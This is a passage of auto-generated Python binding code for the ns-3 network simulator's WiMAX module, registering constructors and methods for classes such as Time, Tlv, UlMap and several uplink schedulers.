cls.add_constructor([param('ns3::SfVectorTlvValue const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Copy',
'ns3::SfVectorTlvValue *',
[],
is_const=True, is_virtual=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start'), param('uint64_t', 'valueLength')],
is_virtual=True)
return
def register_Ns3SimpleRefCount__Ns3AttributeAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeAccessor__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::AttributeAccessor, ns3::empty, ns3::DefaultDeleter< ns3::AttributeAccessor > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3AttributeChecker_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeChecker__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::AttributeChecker, ns3::empty, ns3::DefaultDeleter< ns3::AttributeChecker > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3AttributeValue_Ns3Empty_Ns3DefaultDeleter__lt__ns3AttributeValue__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::AttributeValue, ns3::empty, ns3::DefaultDeleter< ns3::AttributeValue > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3CallbackImplBase_Ns3Empty_Ns3DefaultDeleter__lt__ns3CallbackImplBase__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::CallbackImplBase, ns3::empty, ns3::DefaultDeleter< ns3::CallbackImplBase > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3EventImpl_Ns3Empty_Ns3DefaultDeleter__lt__ns3EventImpl__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::EventImpl, ns3::empty, ns3::DefaultDeleter< ns3::EventImpl > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3NixVector_Ns3Empty_Ns3DefaultDeleter__lt__ns3NixVector__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::NixVector, ns3::empty, ns3::DefaultDeleter< ns3::NixVector > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3OutputStreamWrapper_Ns3Empty_Ns3DefaultDeleter__lt__ns3OutputStreamWrapper__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::OutputStreamWrapper, ns3::empty, ns3::DefaultDeleter< ns3::OutputStreamWrapper > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3Packet_Ns3Empty_Ns3DefaultDeleter__lt__ns3Packet__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::Packet, ns3::empty, ns3::DefaultDeleter< ns3::Packet > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SimpleRefCount__Ns3TraceSourceAccessor_Ns3Empty_Ns3DefaultDeleter__lt__ns3TraceSourceAccessor__gt___methods(root_module, cls):
cls.add_constructor([])
cls.add_constructor([param('ns3::SimpleRefCount< ns3::TraceSourceAccessor, ns3::empty, ns3::DefaultDeleter< ns3::TraceSourceAccessor > > const &', 'o')])
cls.add_method('Cleanup',
'void',
[],
is_static=True)
return
def register_Ns3SsServiceFlowManager_methods(root_module, cls):
cls.add_constructor([param('ns3::SsServiceFlowManager const &', 'arg0')])
cls.add_constructor([param('ns3::Ptr< ns3::SubscriberStationNetDevice >', 'device')])
cls.add_method('AddServiceFlow',
'void',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('AddServiceFlow',
'void',
[param('ns3::ServiceFlow', 'serviceFlow')])
cls.add_method('CreateDsaAck',
'ns3::Ptr< ns3::Packet >',
[])
cls.add_method('CreateDsaReq',
'ns3::DsaReq',
[param('ns3::ServiceFlow const *', 'serviceFlow')])
cls.add_method('DoDispose',
'void',
[],
is_virtual=True)
cls.add_method('GetDsaAckTimeoutEvent',
'ns3::EventId',
[],
is_const=True)
cls.add_method('GetDsaRspTimeoutEvent',
'ns3::EventId',
[],
is_const=True)
cls.add_method('GetMaxDsaReqRetries',
'uint8_t',
[],
is_const=True)
cls.add_method('InitiateServiceFlows',
'void',
[])
cls.add_method('ProcessDsaRsp',
'void',
[param('ns3::DsaRsp const &', 'dsaRsp')])
cls.add_method('ScheduleDsaReq',
'void',
[param('ns3::ServiceFlow const *', 'serviceFlow')])
cls.add_method('SetMaxDsaReqRetries',
'void',
[param('uint8_t', 'maxDsaReqRetries')])
return
def register_Ns3ThreeLogDistancePropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3Time_methods(root_module, cls):
cls.add_binary_comparison_operator('!=')
cls.add_inplace_numeric_operator('+=', param('ns3::Time const &', 'right'))
cls.add_binary_numeric_operator('+', root_module['ns3::Time'], root_module['ns3::Time'], param('ns3::Time const &', 'right'))
cls.add_binary_numeric_operator('-', root_module['ns3::Time'], root_module['ns3::Time'], param('ns3::Time const &', 'right'))
cls.add_binary_comparison_operator('<')
cls.add_binary_comparison_operator('>')
cls.add_inplace_numeric_operator('-=', param('ns3::Time const &', 'right'))
cls.add_output_stream_operator()
cls.add_binary_comparison_operator('<=')
cls.add_binary_comparison_operator('==')
cls.add_binary_comparison_operator('>=')
cls.add_constructor([])
cls.add_constructor([param('ns3::Time const &', 'o')])
cls.add_constructor([param('double', 'v')])
cls.add_constructor([param('int', 'v')])
cls.add_constructor([param('long int', 'v')])
cls.add_constructor([param('long long int', 'v')])
cls.add_constructor([param('unsigned int', 'v')])
cls.add_constructor([param('long unsigned int', 'v')])
cls.add_constructor([param('long long unsigned int', 'v')])
cls.add_constructor([param('std::string const &', 's')])
cls.add_constructor([param('ns3::int64x64_t const &', 'value')])
cls.add_method('Compare',
'int',
[param('ns3::Time const &', 'o')],
is_const=True)
cls.add_method('From',
'ns3::Time',
[param('ns3::int64x64_t const &', 'from'), param('ns3::Time::Unit', 'timeUnit')],
is_static=True)
cls.add_method('From',
'ns3::Time',
[param('ns3::int64x64_t const &', 'value')],
is_static=True)
cls.add_method('FromDouble',
'ns3::Time',
[param('double', 'value'), param('ns3::Time::Unit', 'timeUnit')],
is_static=True)
cls.add_method('FromInteger',
'ns3::Time',
[param('uint64_t', 'value'), param('ns3::Time::Unit', 'timeUnit')],
is_static=True)
cls.add_method('GetDouble',
'double',
[],
is_const=True)
cls.add_method('GetFemtoSeconds',
'int64_t',
[],
is_const=True)
cls.add_method('GetInteger',
'int64_t',
[],
is_const=True)
cls.add_method('GetMicroSeconds',
'int64_t',
[],
is_const=True)
cls.add_method('GetMilliSeconds',
'int64_t',
[],
is_const=True)
cls.add_method('GetNanoSeconds',
'int64_t',
[],
is_const=True)
cls.add_method('GetPicoSeconds',
'int64_t',
[],
is_const=True)
cls.add_method('GetResolution',
'ns3::Time::Unit',
[],
is_static=True)
cls.add_method('GetSeconds',
'double',
[],
is_const=True)
cls.add_method('GetTimeStep',
'int64_t',
[],
is_const=True)
cls.add_method('IsNegative',
'bool',
[],
is_const=True)
cls.add_method('IsPositive',
'bool',
[],
is_const=True)
cls.add_method('IsStrictlyNegative',
'bool',
[],
is_const=True)
cls.add_method('IsStrictlyPositive',
'bool',
[],
is_const=True)
cls.add_method('IsZero',
'bool',
[],
is_const=True)
cls.add_method('SetResolution',
'void',
[param('ns3::Time::Unit', 'resolution')],
is_static=True)
cls.add_method('To',
'ns3::int64x64_t',
[param('ns3::Time::Unit', 'timeUnit')],
is_const=True)
cls.add_method('ToDouble',
'double',
[param('ns3::Time::Unit', 'timeUnit')],
is_const=True)
cls.add_method('ToInteger',
'int64_t',
[param('ns3::Time::Unit', 'timeUnit')],
is_const=True)
return
def register_Ns3Tlv_methods(root_module, cls):
cls.add_constructor([param('uint8_t', 'type'), param('uint64_t', 'length'), param('ns3::TlvValue const &', 'value')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Tlv const &', 'tlv')])
cls.add_method('Copy',
'ns3::Tlv *',
[],
is_const=True)
cls.add_method('CopyValue',
'ns3::TlvValue *',
[],
is_const=True)
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetLength',
'uint64_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetSizeOfLen',
'uint8_t',
[],
is_const=True)
cls.add_method('GetType',
'uint8_t',
[],
is_const=True)
cls.add_method('PeekValue',
'ns3::TlvValue *',
[])
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
return
def register_Ns3TraceSourceAccessor_methods(root_module, cls):
cls.add_constructor([param('ns3::TraceSourceAccessor const &', 'arg0')])
cls.add_constructor([])
cls.add_method('Connect',
'bool',
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('ConnectWithoutContext',
'bool',
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('ns3::CallbackBase const &', 'cb')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Disconnect',
'bool',
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('std::string', 'context'), param('ns3::CallbackBase const &', 'cb')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('DisconnectWithoutContext',
'bool',
[param('ns3::ObjectBase *', 'obj', transfer_ownership=False), param('ns3::CallbackBase const &', 'cb')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3Trailer_methods(root_module, cls):
cls.add_output_stream_operator()
cls.add_constructor([])
cls.add_constructor([param('ns3::Trailer const &', 'arg0')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'end')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_pure_virtual=True, is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_pure_virtual=True, is_const=True, is_virtual=True)
return
def register_Ns3TwoRayGroundPropagationLossModel_methods(root_module, cls):
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_constructor([])
cls.add_method('SetLambda',
'void',
[param('double', 'frequency'), param('double', 'speed')])
cls.add_method('SetLambda',
'void',
[param('double', 'lambda')])
cls.add_method('SetSystemLoss',
'void',
[param('double', 'systemLoss')])
cls.add_method('SetMinDistance',
'void',
[param('double', 'minDistance')])
cls.add_method('GetMinDistance',
'double',
[],
is_const=True)
cls.add_method('GetLambda',
'double',
[],
is_const=True)
cls.add_method('GetSystemLoss',
'double',
[],
is_const=True)
cls.add_method('SetHeightAboveZ',
'void',
[param('double', 'heightAboveZ')])
cls.add_method('DoCalcRxPower',
'double',
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],
is_const=True, visibility='private', is_virtual=True)
return
def register_Ns3Ucd_methods(root_module, cls):
cls.add_constructor([param('ns3::Ucd const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddUlBurstProfile',
'void',
[param('ns3::OfdmUlBurstProfile', 'ulBurstProfile')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetChannelEncodings',
'ns3::OfdmUcdChannelEncodings',
[],
is_const=True)
cls.add_method('GetConfigurationChangeCount',
'uint8_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetNrUlBurstProfiles',
'uint8_t',
[],
is_const=True)
cls.add_method('GetRangingBackoffEnd',
'uint8_t',
[],
is_const=True)
cls.add_method('GetRangingBackoffStart',
'uint8_t',
[],
is_const=True)
cls.add_method('GetRequestBackoffEnd',
'uint8_t',
[],
is_const=True)
cls.add_method('GetRequestBackoffStart',
'uint8_t',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetUlBurstProfiles',
'std::vector< ns3::OfdmUlBurstProfile >',
[],
is_const=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetChannelEncodings',
'void',
[param('ns3::OfdmUcdChannelEncodings', 'channelEncodings')])
cls.add_method('SetConfigurationChangeCount',
'void',
[param('uint8_t', 'ucdCount')])
cls.add_method('SetNrUlBurstProfiles',
'void',
[param('uint8_t', 'nrUlBurstProfiles')])
cls.add_method('SetRangingBackoffEnd',
'void',
[param('uint8_t', 'rangingBackoffEnd')])
cls.add_method('SetRangingBackoffStart',
'void',
[param('uint8_t', 'rangingBackoffStart')])
cls.add_method('SetRequestBackoffEnd',
'void',
[param('uint8_t', 'requestBackoffEnd')])
cls.add_method('SetRequestBackoffStart',
'void',
[param('uint8_t', 'requestBackoffStart')])
return
def register_Ns3UlJob_methods(root_module, cls):
cls.add_binary_comparison_operator('==')
cls.add_constructor([param('ns3::UlJob const &', 'arg0')])
cls.add_constructor([])
cls.add_method('GetDeadline',
'ns3::Time',
[])
cls.add_method('GetPeriod',
'ns3::Time',
[])
cls.add_method('GetReleaseTime',
'ns3::Time',
[])
cls.add_method('GetSchedulingType',
'ns3::ServiceFlow::SchedulingType',
[])
cls.add_method('GetServiceFlow',
'ns3::ServiceFlow *',
[])
cls.add_method('GetSize',
'uint32_t',
[])
cls.add_method('GetSsRecord',
'ns3::SSRecord *',
[])
cls.add_method('GetType',
'ns3::ReqType',
[])
cls.add_method('SetDeadline',
'void',
[param('ns3::Time', 'deadline')])
cls.add_method('SetPeriod',
'void',
[param('ns3::Time', 'period')])
cls.add_method('SetReleaseTime',
'void',
[param('ns3::Time', 'releaseTime')])
cls.add_method('SetSchedulingType',
'void',
[param('ns3::ServiceFlow::SchedulingType', 'schedulingType')])
cls.add_method('SetServiceFlow',
'void',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('SetSize',
'void',
[param('uint32_t', 'size')])
cls.add_method('SetSsRecord',
'void',
[param('ns3::SSRecord *', 'ssRecord')])
cls.add_method('SetType',
'void',
[param('ns3::ReqType', 'type')])
return
def register_Ns3UlMap_methods(root_module, cls):
cls.add_constructor([param('ns3::UlMap const &', 'arg0')])
cls.add_constructor([])
cls.add_method('AddUlMapElement',
'void',
[param('ns3::OfdmUlMapIe', 'ulMapElement')])
cls.add_method('Deserialize',
'uint32_t',
[param('ns3::Buffer::Iterator', 'start')],
is_virtual=True)
cls.add_method('GetAllocationStartTime',
'uint32_t',
[],
is_const=True)
cls.add_method('GetInstanceTypeId',
'ns3::TypeId',
[],
is_const=True, is_virtual=True)
cls.add_method('GetName',
'std::string',
[],
is_const=True)
cls.add_method('GetSerializedSize',
'uint32_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetUcdCount',
'uint8_t',
[],
is_const=True)
cls.add_method('GetUlMapElements',
'std::list< ns3::OfdmUlMapIe >',
[],
is_const=True)
cls.add_method('Print',
'void',
[param('std::ostream &', 'os')],
is_const=True, is_virtual=True)
cls.add_method('Serialize',
'void',
[param('ns3::Buffer::Iterator', 'start')],
is_const=True, is_virtual=True)
cls.add_method('SetAllocationStartTime',
'void',
[param('uint32_t', 'allocationStartTime')])
cls.add_method('SetUcdCount',
'void',
[param('uint8_t', 'ucdCount')])
return
def register_Ns3UplinkScheduler_methods(root_module, cls):
cls.add_constructor([param('ns3::UplinkScheduler const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])
cls.add_method('AddUplinkAllocation',
'void',
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('AllocateInitialRangingInterval',
'void',
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('CalculateAllocationStartTime',
'uint32_t',
[],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetBs',
'ns3::Ptr< ns3::BaseStationNetDevice >',
[],
is_virtual=True)
cls.add_method('GetChannelDescriptorsToUpdate',
'void',
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('GetDcdTimeStamp',
'ns3::Time',
[],
is_const=True, is_virtual=True)
cls.add_method('GetIsInvIrIntrvlAllocated',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('GetIsIrIntrvlAllocated',
'bool',
[],
is_const=True, is_virtual=True)
cls.add_method('GetNrIrOppsAllocated',
'uint8_t',
[],
is_const=True, is_virtual=True)
cls.add_method('GetTimeStampIrInterval',
'ns3::Time',
[],
is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetUcdTimeStamp',
'ns3::Time',
[],
is_const=True, is_virtual=True)
cls.add_method('GetUplinkAllocations',
'std::list< ns3::OfdmUlMapIe >',
[],
is_const=True, is_virtual=True)
cls.add_method('InitOnce',
'void',
[],
is_pure_virtual=True, is_virtual=True)
cls.add_method('OnSetRequestedBandwidth',
'void',
[param('ns3::ServiceFlowRecord *', 'sfr')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('ProcessBandwidthRequest',
'void',
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('Schedule',
'void',
[],
is_pure_virtual=True, is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'bool',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('ServiceUnsolicitedGrants',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_pure_virtual=True, is_virtual=True)
cls.add_method('SetBs',
'void',
[param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')],
is_virtual=True)
cls.add_method('SetDcdTimeStamp',
'void',
[param('ns3::Time', 'dcdTimeStamp')],
is_virtual=True)
cls.add_method('SetIsInvIrIntrvlAllocated',
'void',
[param('bool', 'isInvIrIntrvlAllocated')],
is_virtual=True)
cls.add_method('SetIsIrIntrvlAllocated',
'void',
[param('bool', 'isIrIntrvlAllocated')],
is_virtual=True)
cls.add_method('SetNrIrOppsAllocated',
'void',
[param('uint8_t', 'nrIrOppsAllocated')],
is_virtual=True)
cls.add_method('SetTimeStampIrInterval',
'void',
[param('ns3::Time', 'timeStampIrInterval')],
is_virtual=True)
cls.add_method('SetUcdTimeStamp',
'void',
[param('ns3::Time', 'ucdTimeStamp')],
is_virtual=True)
cls.add_method('SetupServiceFlow',
'void',
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],
is_pure_virtual=True, is_virtual=True)
return
def register_Ns3UplinkSchedulerMBQoS_methods(root_module, cls):
cls.add_constructor([param('ns3::UplinkSchedulerMBQoS const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Time', 'time')])
cls.add_method('AddUplinkAllocation',
'void',
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('AllocateInitialRangingInterval',
'void',
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('CalculateAllocationStartTime',
'uint32_t',
[],
is_virtual=True)
cls.add_method('CheckDeadline',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('CheckMinimumBandwidth',
'void',
[param('uint32_t &', 'availableSymbols')])
cls.add_method('CountSymbolsJobs',
'uint32_t',
[param('ns3::Ptr< ns3::UlJob >', 'job')])
cls.add_method('CountSymbolsQueue',
'uint32_t',
[param('std::list< ns3::Ptr< ns3::UlJob > >', 'jobs')])
cls.add_method('CreateUlJob',
'ns3::Ptr< ns3::UlJob >',
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedType'), param('ns3::ReqType', 'reqType')])
cls.add_method('DequeueJob',
'ns3::Ptr< ns3::UlJob >',
[param('ns3::UlJob::JobPriority', 'priority')])
cls.add_method('DetermineDeadline',
'ns3::Time',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('EnqueueJob',
'void',
[param('ns3::UlJob::JobPriority', 'priority'), param('ns3::Ptr< ns3::UlJob >', 'job')])
cls.add_method('GetChannelDescriptorsToUpdate',
'void',
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],
is_virtual=True)
cls.add_method('GetPendingSize',
'uint32_t',
[param('ns3::ServiceFlow *', 'serviceFlow')])
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetUplinkAllocations',
'std::list< ns3::OfdmUlMapIe >',
[],
is_const=True, is_virtual=True)
cls.add_method('InitOnce',
'void',
[],
is_virtual=True)
cls.add_method('OnSetRequestedBandwidth',
'void',
[param('ns3::ServiceFlowRecord *', 'sfr')],
is_virtual=True)
cls.add_method('ProcessBandwidthRequest',
'void',
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],
is_virtual=True)
cls.add_method('Schedule',
'void',
[],
is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'bool',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('ServiceBandwidthRequestsBytes',
'bool',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols'), param('uint32_t', 'allocationSizeBytes')])
cls.add_method('ServiceUnsolicitedGrants',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('SetupServiceFlow',
'void',
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],
is_virtual=True)
cls.add_method('UplinkSchedWindowTimer',
'void',
[])
return
def register_Ns3UplinkSchedulerRtps_methods(root_module, cls):
cls.add_constructor([param('ns3::UplinkSchedulerRtps const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])
cls.add_method('AddUplinkAllocation',
'void',
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('AllocateInitialRangingInterval',
'void',
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('CalculateAllocationStartTime',
'uint32_t',
[],
is_virtual=True)
cls.add_method('GetChannelDescriptorsToUpdate',
'void',
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],
is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetUplinkAllocations',
'std::list< ns3::OfdmUlMapIe >',
[],
is_const=True, is_virtual=True)
cls.add_method('InitOnce',
'void',
[],
is_virtual=True)
cls.add_method('OnSetRequestedBandwidth',
'void',
[param('ns3::ServiceFlowRecord *', 'sfr')],
is_virtual=True)
cls.add_method('ProcessBandwidthRequest',
'void',
[param('ns3::BandwidthRequestHeader const &', 'bwRequestHdr')],
is_virtual=True)
cls.add_method('Schedule',
'void',
[],
is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('ServiceBandwidthRequests',
'bool',
[param('ns3::ServiceFlow *', 'serviceFlow'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('ServiceUnsolicitedGrants',
'void',
[param('ns3::SSRecord const *', 'ssRecord'), param('ns3::ServiceFlow::SchedulingType', 'schedulingType'), param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('ns3::WimaxPhy::ModulationType const', 'modulationType'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('SetupServiceFlow',
'void',
[param('ns3::SSRecord *', 'ssRecord'), param('ns3::ServiceFlow *', 'serviceFlow')],
is_virtual=True)
cls.add_method('ULSchedulerRTPSConnection',
'void',
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')])
return
def register_Ns3UplinkSchedulerSimple_methods(root_module, cls):
cls.add_constructor([param('ns3::UplinkSchedulerSimple const &', 'arg0')])
cls.add_constructor([])
cls.add_constructor([param('ns3::Ptr< ns3::BaseStationNetDevice >', 'bs')])
cls.add_method('AddUplinkAllocation',
'void',
[param('ns3::OfdmUlMapIe &', 'ulMapIe'), param('uint32_t const &', 'allocationSize'), param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('AllocateInitialRangingInterval',
'void',
[param('uint32_t &', 'symbolsToAllocation'), param('uint32_t &', 'availableSymbols')],
is_virtual=True)
cls.add_method('CalculateAllocationStartTime',
'uint32_t',
[],
is_virtual=True)
cls.add_method('GetChannelDescriptorsToUpdate',
'void',
[param('bool &', 'arg0'), param('bool &', 'arg1'), param('bool &', 'arg2'), param('bool &', 'arg3')],
is_virtual=True)
cls.add_method('GetTypeId',
'ns3::TypeId',
[],
is_static=True)
cls.add_method('GetUplinkAllocations',
